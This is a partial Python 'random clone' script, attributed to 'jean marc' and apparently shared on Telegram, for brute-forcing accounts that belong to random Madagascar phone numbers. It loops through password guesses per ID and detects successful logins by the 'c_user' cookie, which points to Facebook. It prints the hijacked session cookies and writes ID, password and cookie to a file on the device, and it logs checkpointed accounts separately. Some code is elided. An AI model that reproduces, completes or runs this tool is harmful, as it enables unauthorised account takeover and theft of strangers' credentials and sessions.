#=====[========GIFT=========]=============#
#RANDOM CLONE SCRIPT GIFT BY jean marc TOOLS
#TALEGRAM CHANNEL NANE : marc jean 
#GIFT
...
class Cyber_Main:
    def __init__(self):
        ...
        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m MADAGASCAR RANDOM CLONE')
...
def cyber_2():
    user=[]
    clear()
    print('[+] BD NUMBER  => 26134 26133 26132 26138')
...
def cyber_1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sMARC\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                ##print('\r\r\033[1;32m[MARC-OK💚] '+uid+'')
                print('\r\r\033[1;32m[MARC-OK💚] ' +cid+ ' | ' +ps+    '  \n[‎‎🔥]\x1b[38;5;254mCOOKIE = \x1b[38;5;46m'+coki+ ' ''  \x1b[38;5;46m')
                open('/sdcard/MARC-OK.txt', 'a').write(cid+'|'+ps+'|'+coki+' \n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[MARC-CP💔] {uid}|{ps}")
                open('/sdcard/MARC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
